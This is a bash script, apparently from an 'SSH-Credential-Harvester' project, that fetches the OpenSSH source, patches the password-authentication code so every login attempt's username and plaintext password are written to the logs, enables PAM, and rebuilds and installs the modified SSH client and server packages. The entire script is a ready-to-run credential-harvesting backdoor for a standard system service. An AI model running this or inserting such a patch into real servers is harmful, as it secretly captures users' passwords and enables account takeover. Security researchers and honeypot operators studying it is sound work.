#! /bin/bash

# Logs SSH Credentials. Tested on Kali Linux.

# Set the install directory
installDirectory="/opt/jamesm0rr1s/SSH-Credential-Harvester/OpenSSH"

# Create the install directory
mkdir -p $installDirectory
	
# Change to the install directory
cd $installDirectory

# Install dpkg-dev
apt install -yq dpkg-dev

# remove the "# " in front of deb-src within /etc/apt/sources.list
sed -i "s/# deb-src/deb-src/g" /etc/apt/sources.list

# Update package list to pick up new repository's package information
apt update

# Ignore prompt to restart services
export DEBIAN_FRONTEND=noninteractive

# Install OpenSSH
apt build-dep -yq openssh-server
apt source -yq openssh-server

# Get the directory for the current OpenSSH version
setupDirectory=$installDirectory/`ls -d $installDirectory/*/ | rev | cut -d "/" -f 2 | rev`

# Change to the OpenSSH directory
cd $setupDirectory

# Make a backup of the file
cp $setupDirectory/auth-passwd.c $setupDirectory/auth-passwd.c.bak

# Log passwords
sed -i 's/return (sshpam_auth_passwd(authctxt, password) && ok);/logit("SSH Login Attempt: Username: %s Password: %s", authctxt->user, password);\n\t\treturn (sshpam_auth_passwd(authctxt, password) \&\& ok);/g' $setupDirectory/auth-passwd.c

# Use PAM
sed -i "s/UsePAM no/UsePAM yes/g" /etc/ssh/sshd_config

# Rebuild to package
dpkg-buildpackage -rfakeroot -uc -b

# Get the name of the .deb client file
debFile=`ls $setupDirectory/../openssh-client_*.deb`

# Install the OpenSSH client
dpkg -i $debFile

# Get the name of the .deb server file
debFile=`ls $setupDirectory/../openssh-server_*.deb`

# Install the OpenSSH server
dpkg -i $debFile

# Get the name of the .deb sftp server file
debFile=`ls $setupDirectory/../openssh-sftp-server_*.deb`

# Install the sftp server
dpkg -i $debFile

# Start OpenSSH
service ssh start